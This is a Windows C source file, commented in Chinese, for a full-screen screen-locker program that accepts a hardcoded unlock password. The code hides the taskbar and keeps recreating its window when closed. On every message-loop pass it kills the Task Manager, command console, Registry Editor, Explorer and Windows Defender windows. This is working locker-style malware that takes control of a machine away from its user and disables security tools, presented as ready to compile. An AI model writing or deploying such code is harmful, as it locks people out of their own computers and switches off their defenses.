#include "util.h"

// gcc .\test2.c -o .\test2.exe -user32 -mwindows

HFONT font = NULL;
HWND hwnd=NULL;
HWND hwndEdit = NULL;
HWND hwndTaskbar=NULL;
HWND taskmgrWnd=NULL;
HWND cmdWnd=NULL;
HWND regEditWnd=NULL;
HWND explorerWnd=NULL;
HWND runWnd=NULL;
HWND WSG=NULL;

int screen_width=0;
int screen_height=0;

char miYaoRoot[8]="qwe123";
char miYao[8];
int isLook=1;
int isWrong=0;

// 隐藏任务管理器窗口/cmd
void KillTaskmgr()
{
    // 查找任务管理器窗口句柄
    taskmgrWnd = FindWindowA("TaskManagerWindow", NULL);
    cmdWnd = FindWindowA("ConsoleWindowClass", NULL);
    regEditWnd = FindWindowA("RegEdit_RegEdit", NULL);
    explorerWnd = FindWindowA("CabinetWClass", NULL);
    runWnd = FindWindowA("Shell_TrayWnd",NULL);
    WSG = FindWindowA("WindowsDefenderMain",NULL);
    if (taskmgrWnd||cmdWnd||regEditWnd||explorerWnd||runWnd||WSG)
    {
        // SetForegroundWindow(hwnd);
        // ShowWindow(taskmgrWnd, SW_MINIMIZE);

        // 通过pid进行删除
        KillProcess(taskmgrWnd);
        KillProcess(cmdWnd);
        KillProcess(regEditWnd);
        KillProcess(explorerWnd);
        KillProcess(runWnd);
        KillProcess(WSG);

    }
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    // 创建主窗口
    WNDCLASS wc = { 0 };
    wc.lpfnWndProc = WindowProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = "LockYourWindowClass";
    wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
    RegisterClass(&wc);

    // 获取屏幕尺寸
    screen_width = GetSystemMetrics(SM_CXSCREEN);
    screen_height = GetSystemMetrics(SM_CYSCREEN);

    // Alt+F4时，窗口程序被杀掉，但是主程序还在后台
    while(hwnd==NULL&&isLook==1){

        hwnd = CreateWindow(
            "LockYourWindowClass",
            "Window",
            WS_POPUP | WS_VISIBLE, // 隐藏调整边框
            CW_USEDEFAULT, CW_USEDEFAULT, screen_width, screen_height,
            NULL,
            NULL,
            hInstance,
            NULL
        );

        // 创建编辑框
        hwndEdit = CreateWindow(
            "EDIT",
            NULL,
            WS_VISIBLE | WS_CHILD | WS_BORDER | ES_MULTILINE | ES_AUTOVSCROLL,
            (screen_width-300)/2 , (screen_height-30)/2, 300,25 , // 5,70表示左上角的x,y;后面两位表示宽度，高度
            hwnd,
            (HMENU)1,   // wmId
            hInstance,
            NULL
        );

        // 创建按钮
        HWND hButton = CreateWindowW(
            L"BUTTON",
            L"退出",
            WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
            (screen_width+300-80)/2 , (screen_height-90)/2, 40,30 ,
            hwnd,
            (HMENU)2,   // wmid
            NULL,
            NULL
        );

        // 设置输入法为英文输入法
        HKL englishLayout = LoadKeyboardLayout("00000409", KLF_ACTIVATE);

        // 设置字体和颜色
        LOGFONT lf = { 0 };
        lf.lfHeight = FONT_SIZE;
        lf.lfWeight = FW_NORMAL;
        strcpy(lf.lfFaceName, "simhei");
        font = CreateFontIndirect(&lf);
        SendMessage(hwndEdit, WM_SETFONT, (WPARAM)font, TRUE);

        // 隐藏任务栏
        hwndTaskbar = FindWindow("Shell_TrayWnd", NULL);
        ShowWindow(hwndTaskbar, SW_HIDE);

        // 显示窗口
        ShowWindow(hwnd, nCmdShow);

        // 消息循环
        MSG msg;
        while (GetMessage(&msg, NULL, 0, 0))
        {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
            KillTaskmgr();
        }
    }

    // 清理资源
    DeleteObject(font);
    return 0;
}
